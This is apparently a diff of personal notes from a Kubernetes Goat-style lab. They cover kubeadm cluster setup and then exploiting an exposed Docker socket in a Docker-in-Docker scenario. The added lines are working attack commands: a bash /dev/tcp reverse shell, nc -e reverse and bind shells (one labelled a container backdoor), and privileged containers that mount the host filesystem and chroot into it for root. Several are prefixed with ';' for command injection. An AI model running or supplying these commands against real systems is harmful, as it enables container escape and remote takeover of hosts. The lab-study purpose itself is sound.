@@ -18,6 +18,7 @@ kubeadm join k8s-master.ndbien.local:6443 --token z1fw1r.y7thhxcisqh8zvzb \
 
 curl https://raw.githubusercontent.com/projectcalico/calico/v3.25.0/manifests/calico.yaml -O
 
+# kubeadm command
 sudo kubeadm reset
 
 sudo kubeadm init
@@ -31,7 +32,7 @@ kubectl get pods -n kube-system
 
 kubectl get nodes
 
-
+#exploit DIND
  ;/tmp/crictl -r unix:///custom/containerd/containerd.sock pull biladen/php-hack
 
 https://www.letscloud.io/community/how-to-install-kubernetesk8s-and-docker-on-ubuntu-2004
@@ -49,8 +50,9 @@ https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docke
 ;wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz -O /tmp/docker.tgz
 
 ;tar -xvzf /tmp/docker.tgz -C /tmp/
-
-;tmp/docker/docker -H unix:///custom/docker/docker.sock images
+docker/ docker/docker-containerd-ctr docker/docker-proxy docker/docker docker/docker-containerd docker/dockerd docker/docker-init docker/docker-containerd-shim docker/docker-runc
+;tmp/docker/docker -H unix:///run/docker.sock images
+docker -H unix:///run/cri-dockerd.sock run -it --rm --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu chroot /host bash
 
 ;tmp/docker/docker -H unix:///custom/docker/docker.sock build -t php-hack /data/
 ;tmp/docker/docker -H unix:///custom/docker/docker.sock run -dp 8089:80 php-hack
@@ -60,22 +62,47 @@ chmod 666 /var/run/docker.sock
 ls -l /custom/docker/docker.sock
 DOCKER_HOST=unix:///custom/docker/docker.sock docker version
 
-kubectl exec -it health-check-deployment-799f864f94-wzq4d -- /bin/bash
+#kube exec
 
-id
+kubectl exec -it health-check-deployment-77466cffcd-2zjsq     -- /bin/bash
+kubectl delete pod health-check-deployment-6684977b6-ttc7m
 
-mount
-
+# lệnh docker
 docker -H unix:///run/docker.sock  images
 
 docker -H unix:///run/docker.sock run -p 8085:80  ph4n10m1808/hacked_images_docker
 
 hostname -I
 
-curl http://10.244.0.45:8085
-
 docker exec -it a221d98fdd21 curl http://localhost:80
 
-kubectl exec -it health-check-deployment-5479685f9b-g4hvj    -- bash
+kubectl exec -it health-check-deployment-6684977b6-ttc7m     -- bash
 
 docker -H unix:///run/docker.sock run -p 8085:80 ph4n10m1808/hacked_images_docker
+
+#rce
+bash -c 'bash -i >& /dev/tcp/192.168.1.3/1337 0>&1'
+
+#docker break
+/tmp/docker/docker run -i --rm -v /:/mnt alpine chroot /mnt sh
+
+
+#khai thác DIND 
+curl --unix-socket /run/docker.sock http://localhost/containers/json # kiểm tra quyền
+
+;/tmp/docker/docker -H unix:///run/docker.sock run -i --privileged --network=host  -v /:/host alpine chroot /host /bin/sh # lấy quyền root 
+;/tmp/docker/docker -H unix:///run/docker.sock run -d --privileged   -v /:/host alpine sh -c "nc -lp 4444 -e /bin/sh"  #container backdor
+;/tmp/docker/docker run -d --rm --privileged --network host alpine /bin/sh -c "nc -e /bin/sh 192.168.1.3 1337"
+
+
+#Run the image mounting the host disk and chroot on it
+;/tmp/docker/docker run -i -v /:/host/ ubuntu:18.04 chroot /host/ bash
+;/tmp/docker/docker run --rm -i --privileged ubuntu bash
+
+
+nc 192.168.127.207 4444
+#escape to host
+capsh --print
+ls /host-system/
+chroot /host-system bash
+
